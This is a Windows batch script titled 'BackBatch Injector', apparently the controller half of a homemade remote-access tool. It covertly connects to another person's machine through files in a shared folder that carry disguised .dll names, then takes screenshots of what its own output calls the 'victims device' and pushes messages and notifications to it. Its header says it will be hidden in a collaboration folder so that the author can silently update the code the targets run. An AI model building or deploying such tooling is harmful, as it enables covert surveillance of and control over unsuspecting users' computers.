::: BackBatch Injector
::: By 1k0de

:::::: IMPORTANT ::::::
:: This file will be hidden in collaborationa along with the "BackBatch Connection Establisher.bat"
:: This file must be opened user a "Injector Launcher.bat".
:: ----------------------------------------------------------
:: Why?
:: > This is done so the code is always stored in collaboration meaning I can update the whenever I want
:: and whenever they run the program it will run the updated version. (Since its stored in collaboration.)
::
:: > This also applies for the "BackBatcn Connection Establisher.bat"
::
:: > TL;DR - The opener will always run the most updated version stored in collab.
:::::::::::::::::::::::

::Set up window
@echo off
title BackBatch Injection
cls

:::::::::::: Set Up Colors ::::::::::::
setlocal EnableDelayedExpansion

for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set ESC=%%b
)

set "DarkWhite=!ESC![90m"
set "Red=!ESC![91m"
set "Green=!ESC![92m"
set "Yellow=!ESC![93m"
set "Blue=!ESC![94m"
set "Purple=!ESC![95m"
set "Cyan=!ESC![96m"
set "White=!ESC![97m"
set "b_black=!ESC![100m"
set "b_red=!ESC![101m"
set "b_green=!ESC![102m"
set "b_yellow=!ESC![103;30m"
set "b_blue=!ESC![104m"
set "b_purple=!ESC![105m"
set "b_cyan=!ESC![106m"
set "b_white=!ESC![107m"
set "dark_red=!ESC![31m"
set "white_black=!ESC![7m"
set "red_black=!ESC![7;31m"
set "reset=!ESC![0m"
set "bold=!ESC![1m"
set "underline=!ESC![4m"

set "wait=ping localhost -n 2 > nul"
set "_info=!reset![!Blue!INFO!reset!]"
set "_success=!reset![!Green!SUCCESS!reset!]"
set "_error=!reset![!Red!ERROR!reset!]"

set "_deviceStorage=__BACK_BATCH_DATA\"

cls
GOTO device
:::::::::::::::::::::::::::::::::::::::





:::::::::::: Enter Device Function ::::::::::::
:device
echo.
set "_d="
echo !reset![!b_red!Enter Device!reset!]
set /p "_d=> "
echo.
GOTO _load
:::::::::::::::::::::::::::::::::::::::::::::::





:::::::::::: Loading Function ::::::::::::
:_load
set "_failError=UnknownError..."
%wait%
echo %_info% Injecting...
%wait%
echo %_info% Searching for files...
%wait%

if "!_d!" == "" ( GOTO injection_fail )

if not exist "!_deviceStorage!" (
	mkdir "!_deviceStorage!"
)

if not exist "!_deviceStorage!\!_d!" (
	set "_failError=Could not find files..."
	GOTO injection_fail
)

:: Establish connection by sending a connection signal and await a response
echo %_info% Establishing connection...

echo !username!>"%_deviceStorage%\!_d!\BB_Inject.dll"

if exist "%_deviceStorage%\!_d!\BB_response.dll" (
	del /f /q "%_deviceStorage%\!_d!\BB_response.dll"
)

set /A searchCount=0
goto :await_loop_1

:await_loop_1
set "_injectResponse="
set /A searchCount=%searchCount%+1
if %searchCount% GEQ 10 (
	set "_failError=Could not establish connection, device may be offline..."
	GOTO injection_fail
)
if not exist "%_deviceStorage%\!_d!\BB_Response.dll" (
	%wait%
	GOTO await_loop_1
)
set /p _injectResponse=<"%_deviceStorage%\!_d!\BB_response.dll"
if "!_injectResponse!" == "CONNECTION_ESTABLISHED" (
	%wait%
	echo %_success% Successfully Injected^^!
) else (
	GOTO await_confirmation
)

%wait%
del /f /q "%_deviceStorage%\!_d!\BB_Response.dll"
goto cmd_exec
::::::::::::::::::::::::::::::::::::::::::


:await_confirmation
echo %_info% The specific user logged into the device is elevataed. Asking for permission...
%wait%
set /a _checks=0
GOTO check_confirmation

:check_confirmation
if %_checks% GEQ 25 (
	set "_failError=Request timed out..."
	echo TIMED_OUT>"%_deviceStorage%\!_d!\BB_Response.dll"
	GOTO injection_fail
)
set /p c_contents=<"%_deviceStorage%\!_d!\BB_Response.dll"
if "!c_contents!" == "PERMISSION_GRANTED" (
	echo %_success% Permission Granted...
	del /f /q "%_deviceStorage%\!_d!\BB_Response.dll"
	GOTO cmd_exec
)
if "!c_contents!" == "PERMISSION_DENIED" (
	set "_failError=Connection request denied, you don't have permission to connect to the specific user..."
	GOTO injection_fail
)
set /a _checks+=1
%wait%
GOTO check_confirmation


:::::::::::: Failed Injection ::::::::::::
:injection_fail
echo %_error% %_failError% Not Injected.
pause > nul
exit
::::::::::::::::::::::::::::::::::::::::::


:cmd_exec
set "_input="
set "_msgContent="
echo.
echo !reset![!Cyan!Command Execution!reset!]: !yellow!!_d!!reset!
set /p "_input=> "
if "!_input!" == "exit" (
	echo %_info% Closing connection and exiting...
	echo __ENDCONNECTION__>"%_deviceStorage%\!_d!\BB_Query.dll"
	%wait%
	if exist "%_deviceStorage%\!_d!\BB_Query.dll" (
		del /f /q "%_deviceStorage%\!_d!\BB_Query.dll"
	)
	exit
)
if "!_input!" == "" ( goto cmd_exec )
if "!_input!" == " " ( goto cmd_exec )
if "!_input!" == "snap_screen" (
	if exist "%_deviceStorage%\!_d!\_snapShot.jpg" ( del /f /q "%_deviceStorage%\!_d!\_snapShot.jpg" ) 
	echo __SNAPSCREEN__>"%_deviceStorage%\!_d!\BB_Query.dll"
	%wait% & %wait% & :: This is the minimum time for the _snapShot.jpg to appear.
	if exist "%_deviceStorage%\!_d!\_snapShot.jpg" (
		echo %_success% Snap shotted victims device, opening image...
		"%_deviceStorage%\!_d!\_snapShot.jpg"
	) else (
		echo %_error% An unexpected error occured, image not found...
	)
	goto cmd_exec
)
if "!_input!" == "close_connection" (
	echo __ENDCONNECTION__>"%_deviceStorage%\!_d!\BB_Query.dll"
	%wait% & %wait%
	echo.
	if exist "%_deviceStorage%\!_d!\BB_Query.dll" (
		echo %_error% Could not close connection. ^(Didn^'t receive response, connection may already be closed.^)
		del /f /q "%_deviceStorage%\!_d!\BB_Query.dll"
	)
	echo %_info% Returning to start...
	%wait%
	GOTO device
)
if "!_input!" == "clear" (
	cls
	goto cmd_exec
)
if "!_input!" == "cls" (
	cls
	goto cmd_exec
)
if "!_input!" == "send_message" (
	goto send_msg_command
)
if "!_input!" == "send_notification" (
	goto send_notif_command
)
echo !red_black!Unkown Command:!reset! !_input!
goto cmd_exec


:send_msg_command
set "_msgContent="
set /p "_msgContent=!reset![!blue!ENTER MESSAGE!reset!]: "
if "!_msgContent!" == "" (
	echo %_error% Message Content canno^'t be empty.
	goto cmd_exec
)
echo !_msgContent!>"%_deviceStorage%\!_d!\BB_cmd_content.dll"
echo __MESSAGE__>"%_deviceStorage%\!_d!\BB_Query.dll"
echo.
echo %_info% Sending message...
set /a smc_awaitCount=0
goto send_msg_command_await

:send_msg_command_await
set "_cmdResponse="
if %smc_awaitCount% GEQ 10 (
	echo %_error% There was an error sending the message...
	goto cmd_exec
)
if exist "%_deviceStorage%\!_d!\BB_cmd_response.dll" (
	set /p _cmdResponse=<"%_deviceStorage%\!_d!\BB_cmd_response.dll"
	if "!_cmdResponse!" == "__MESSAGESENT__" (
		echo %_success% Successfully sent message...
	) else (
		echo %_error% Victims device responded with an error...
	)
	del /f /q "%_deviceStorage%\!_d!\BB_cmd_response.dll"
	goto cmd_exec
)
%wait%
set /a smc_awaitCount+=1
goto send_msg_command_await

:send_notif_command
set "_notifContent_title="
set "_notifContent_text="
set /p "_notifContent_title=!reset![!blue!ENTER NOTIFICATION TITLE!reset!]: "
if "!_notifContent_title!" == "" (
	echo %_error% Notification Title cannot be empty.
	goto cmd_exec
)
set /p "_notifContent_text=!reset![!blue!ENTER NOTIFICATION TEXT!reset!]: "
if "!_notifContent_text!" == "" (
	echo %_error% Notification Text cannot be empty.
	goto cmd_exec
)
echo !_notifContent_title!>"%_deviceStorage%\!_d!\BB_notif_title.dll"
echo !_notifContent_text!>"%_deviceStorage%\!_d!\BB_notif_text.dll"
echo __NOTIFICATION__>"%_deviceStorage%\!_d!\BB_Query.dll"
echo.
echo %_info% Sending notification...
set /a snc_awaitCount=0
goto send_notif_command_await

:send_notif_command_await
set "_cmdResponse="
if %snc_awaitCount% GEQ 10 (
	echo %_error% There was an error sending the notification...
	goto cmd_exec
)
if exist "%_deviceStorage%\!_d!\BB_cmd_response.dll" (
	set /p cmdResponse=<"%_deviceStorage%\!_d!\BB_cmd_response.dll"
	if "!cmdResponse!" == "__NOTIFICATIONSENT__" (
		echo %_success% Successfully sent message...
	) else (
		echo %_error% Victims device responded with an error...
	)
	del /f /q "%_deviceStorage%\!_d!\BB_cmd_response.dll"
	goto cmd_exec
)
%wait%
set /a snc_awaitCount+=1
goto send_notif_command_await




:on_exit
echo checking...
goto on_exit
echo %_info% Closing connection and exiting...
echo __ENDCONNECTION__>"%_deviceStorage%\!_d!\BB_Query.dll"
%wait%
if exist "%_deviceStorage%\!_d!\BB_Query.dll" (
	del /f /q "%_deviceStorage%\!_d!\BB_Query.dll"
)




